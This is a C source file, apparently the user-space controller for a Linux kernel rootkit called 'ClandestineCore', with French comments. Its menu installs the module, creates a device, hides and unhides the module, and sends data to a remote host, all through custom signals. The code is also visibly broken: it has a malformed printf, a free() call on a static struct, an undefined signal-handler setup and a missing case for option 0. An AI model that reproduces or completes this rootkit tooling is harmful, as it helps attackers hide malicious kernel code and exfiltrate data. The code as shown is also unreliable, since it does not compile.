#include <stdio.h>
#include <stdlib.h>

#define MODPATH "../kmodule/ClandestineCore.mod.o"
#define SIGALWRECV 50
#define SIGREMRECV 51
#define SIGHIDEMOD 52
#define SIGUNHIDEM 53
#define SIGSENDNET 54

typedef struct ctx {
    int module_loaded;
    int module_hidded;
    int rHost_set;
    int rPort_set;
    int payload_set;
}ctx ;
static ctx context = {
    .module_loaded = 0,
    .module_hidded = 0,
    .rHost_set = 0,
    .rPort_set = 0,
    .payload_set = 0,
};

void show_menu(void) {
    printf("\n=== Menu ===\n");
    printf("0. Install ClandestineCore\n");
    printf("1. Create Device (/dev/devcc) (%s)\n", );
    printf("2. Close Device\n");
    printf("3. Hide Module\n");
    printf("4. Unhide Module\n");
    printf("5. Send Data\n");
    printf("6. Exit\n");
    printf("Choix : ");
}

int main(int argc, char** argv) {

    // Mise en place des gestionnaires de signaux pour éviter la terminaison du processus
    setup_signal_handlers();

    int choice;
    while (1) {
        show_menu();
        if (scanf("%d", &choice) != 1) {
            fprintf(stderr, "Erreur de lecture\n");
            break;
        }
        switch (choice) {
            case 1:
                kill(getpid(), SIGALWRECV);
                break;
            case 2:
                kill(getpid(), SIGREMRECV);
                break;
            case 3:
                kill(getpid(), SIGHIDEMOD);
                break;
            case 4:
                kill(getpid(), SIGUNHIDEM);
                break;
            case 5:
                kill(getpid(), SIGSENDNET);
                break;
            case 6:
                printf("Sortie...\n");
                free(context);
                exit(EXIT_SUCCESS);
            default:
                printf("Choix invalide\n");
        }
    }

    free(context);
    return 0;
}